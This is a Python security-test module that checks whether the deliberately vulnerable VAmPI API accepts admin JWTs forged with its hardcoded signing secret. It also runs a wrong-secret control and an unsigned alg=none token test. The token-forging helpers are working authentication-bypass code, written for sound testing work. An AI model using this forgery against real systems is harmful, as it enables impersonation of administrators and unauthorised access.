"""
Broken Authentication (OWASP API2:2023) tests: JWT weak signing bypass.
"""

from __future__ import annotations

import logging
from datetime import datetime, timedelta, timezone
from typing import Optional

import jwt

from src.utils.results_logger import RunLogger
from src.utils.vampi_client import VAmPIClient
from src.vulnerabilities.authorization import BOOKS_PATH
from src.vulnerabilities.base import Severity, VulnerabilityResult, VulnerabilityTest

logger = logging.getLogger(__name__)

FORGED_TOKEN_TTL_SECONDS = 3600


class JWTWeakSigningBypassTest(VulnerabilityTest):
    """
    Confirms whether VAmPI's HS256 auth tokens can be forged against the
    hardcoded Flask SECRET_KEY, without ever completing a real login.

    config.py sets `vuln_app.app.config['SECRET_KEY'] = 'random'` as a
    fixed literal, and models/user_model.py signs and verifies every token
    with that same value via `jwt.encode(..., algorithm='HS256')` /
    `jwt.decode(..., algorithms=["HS256"])`. Since PyJWT's `decode()` call
    restricts to `algorithms=["HS256"]`, an unsigned `alg: none` token is a
    separate, independently-tested root cause rather than a variant of the
    weak-secret finding.
    """

    name = "jwt_weak_signing_bypass"
    owasp_category = "API2:2023 Broken Authentication"

    def __init__(self, architecture: str, target: str, client: VAmPIClient) -> None:
        super().__init__(architecture, target)
        self.client = client
        self.weak_secret: str = client.scan_config.get("jwt_weak_secret", "")
        self.control_secret: str = client.scan_config.get(
            "jwt_control_secret", "control-secret-not-guessed"
        )

    def run(self) -> list[VulnerabilityResult]:
        self.client.seed_database()
        results = [self._test_hs256_algorithm_confirmed()]

        book_title = self._discover_existing_book_title()
        if book_title is None:
            results.append(
                self._result(
                    passed=True,
                    severity=Severity.LOW,
                    evidence=(
                        f"Could not discover an existing book title from GET {BOOKS_PATH} "
                        "to use as the protected-endpoint target — inconclusive setup "
                        "step, not itself a finding."
                    ),
                    request_summary=f"GET {BOOKS_PATH}",
                    response_summary="no books returned",
                )
            )
            return results

        results.append(self._test_weak_secret_forgery(book_title))
        results.append(self._test_control_wrong_secret_rejected(book_title))
        results.append(self._test_alg_none_rejected(book_title))
        return results

    # -- setup ---------------------------------------------------------

    def _discover_existing_book_title(self) -> Optional[str]:
        """`GET /books/v1` requires no auth and lists every user's books
        (see authorization.py's BOLA finding) — used here only to obtain a
        real book title to target with a forged token.
        """
        resp = self.client.get(BOOKS_PATH)
        if resp.status_code != 200:
            return None
        try:
            body = resp.json()
        except ValueError:
            return None
        books = body.get("Books", [])
        if not books or not isinstance(books, list):
            return None
        return books[0].get("book_title")

    @staticmethod
    def _forge_token(secret: str, sub: str) -> str:
        now = datetime.now(timezone.utc)
        payload = {
            "exp": now + timedelta(seconds=FORGED_TOKEN_TTL_SECONDS),
            "iat": now,
            "sub": sub,
        }
        return jwt.encode(payload, secret, algorithm="HS256")

    @staticmethod
    def _forge_alg_none_token(sub: str) -> str:
        now = datetime.now(timezone.utc)
        payload = {
            "exp": now + timedelta(seconds=FORGED_TOKEN_TTL_SECONDS),
            "iat": now,
            "sub": sub,
        }
        return jwt.encode(payload, key="", algorithm="none")

    # -- checks ----------------------------------------------------------

    def _test_hs256_algorithm_confirmed(self) -> VulnerabilityResult:
        """Baseline: decode a real, server-issued token's header (without
        verifying its signature) to confirm HS256 is genuinely the
        algorithm in use before the forgery attempts below assume it.
        """
        self.client.register("attacker")
        token = self.client.login("attacker")
        header = jwt.get_unverified_header(token)
        alg = header.get("alg")
        is_hs256 = alg == "HS256"

        evidence = f"Server-issued token header: {header!r}."
        evidence += (
            " Uses HS256, a symmetric algorithm where the same secret both signs "
            "and verifies — consistent with a forgeable, deployment-wide hardcoded key."
            if is_hs256
            else f" Uses {alg!r}, not HS256 — the forgery attempts below assume HS256 and may not apply."
        )

        return self._result(
            passed=True,
            severity=Severity.LOW,
            evidence=evidence,
            request_summary="POST /users/v1/login as_user='attacker'",
            response_summary=f"token alg={alg!r}",
        )

    def _test_weak_secret_forgery(self, book_title: str) -> VulnerabilityResult:
        path = f"{BOOKS_PATH}/{book_title}"
        forged = self._forge_token(self.weak_secret, sub="admin")
        resp = self.client.get(path, token=forged)
        confirmed = resp.status_code == 200

        evidence = (
            f"Forged a token for 'admin' (never logged in this run) signed with "
            f"the hardcoded Flask SECRET_KEY {self.weak_secret!r} -> GET {path} "
            f"returned HTTP {resp.status_code}."
        )
        if confirmed:
            evidence += (
                " Accepted without ever presenting real credentials, confirming the "
                "signing secret is a fixed, guessable literal rather than a "
                "per-deployment random value."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"GET {path} with forged token (weak secret, sub='admin')",
            response_summary=f"HTTP {resp.status_code}",
            cwe="CWE-321",
        )

    def _test_control_wrong_secret_rejected(
        self, book_title: str
    ) -> VulnerabilityResult:
        """Control: identical forged claims, signed with a different,
        non-guessed secret, must be rejected — otherwise the finding above
        would just mean "any token works", not specifically a weak secret.
        """
        path = f"{BOOKS_PATH}/{book_title}"
        forged = self._forge_token(self.control_secret, sub="admin")
        resp = self.client.get(path, token=forged)
        rejected = resp.status_code == 401

        evidence = (
            f"Control: same forged claims, signed with a different, non-guessed "
            f"secret -> GET {path} returned HTTP {resp.status_code}."
        )
        evidence += (
            " Rejected, confirming the weak-secret result is a genuine key-guessing "
            "bypass and not simply 'any bearer value is accepted'."
            if rejected
            else " NOT rejected — signature verification appears to accept arbitrary secrets."
        )

        return self._result(
            passed=rejected,
            severity=Severity.LOW if rejected else Severity.CRITICAL,
            evidence=evidence,
            request_summary=f"GET {path} with forged token (control secret, sub='admin')",
            response_summary=f"HTTP {resp.status_code}",
        )

    def _test_alg_none_rejected(self, book_title: str) -> VulnerabilityResult:
        """Separate root cause from weak-secret forgery: an unsigned
        `alg: none` token has no secret to guess at all.
        """
        path = f"{BOOKS_PATH}/{book_title}"
        forged = self._forge_alg_none_token(sub="admin")
        resp = self.client.get(path, token=forged)
        rejected = resp.status_code != 200

        evidence = (
            f"Unsigned alg='none' token for 'admin' -> GET {path} returned "
            f"HTTP {resp.status_code}."
        )
        evidence += (
            " Rejected — PyJWT's decode() call is pinned to algorithms=['HS256'], so "
            "alg=none tokens are refused independently of the weak-secret HS256 "
            "forgery confirmed above."
            if rejected
            else " NOT rejected — a second, independent JWT validation gap (alg=none accepted)."
        )

        return self._result(
            passed=rejected,
            severity=Severity.LOW if rejected else Severity.CRITICAL,
            evidence=evidence,
            request_summary=f"GET {path} with alg='none' token, sub='admin'",
            response_summary=f"HTTP {resp.status_code}",
        )


def _print_results(results: list[VulnerabilityResult]) -> None:
    for result in results:
        status = "PASS" if result.passed else f"FAIL ({result.severity.value.upper()})"
        print(f"[{status}] {result.test_name} - {result.owasp_category}")
        print(f"  Evidence:  {result.evidence}")
        print(f"  Request:   {result.request_summary}")
        print(f"  Response:  {result.response_summary}")
        print()


def _run_vampi() -> None:
    client = VAmPIClient.from_config("config/vampi.yaml")
    with RunLogger("rest", "vampi", "config/vampi.yaml") as run:
        results = JWTWeakSigningBypassTest(
            architecture="rest", target="vampi", client=client
        ).run()
        run.log_results(results)
    _print_results(results)


if __name__ == "__main__":
    import argparse

    logging.basicConfig(level=logging.INFO)

    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--target",
        choices=["vampi"],
        default="vampi",
        help=(
            "Which target's container must be up. VAmPI-only for now — "
            "kept as a flag for consistency with the other vulnerability "
            "modules (authorization.py, injection.py, data_exposure.py)."
        ),
    )
    args = parser.parse_args()

    if args.target == "vampi":
        _run_vampi()
